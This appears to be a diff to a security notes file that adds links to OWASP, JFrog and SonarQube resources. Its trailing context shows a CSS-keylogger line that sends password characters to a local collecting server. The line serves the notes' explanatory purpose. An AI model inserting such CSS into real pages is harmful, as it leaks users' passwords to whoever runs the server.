@@ -14,6 +14,11 @@
  * [оценка безопасности ПО](https://tproger.ru/translations/measuring-the-security-of-your-software/)
  * http://tproger.ru/tag/safe-code/
  * [Анализ уязвимостей процесса аутентификации](https://bmsdave.github.io/blog/auth-vulnerabilities/)
+ * []()
+ * https://owasp.org/www-community/Free_for_Open_Source_Application_Security_Tools
+ * artifactory https://jfrog.com/security-and-compliance/
+ * https://www.sonarqube.org/features/security/
+
 
 ```css
 input[type="password"][value$="A"] { background-image: url("http://localhost:3000/A"); }
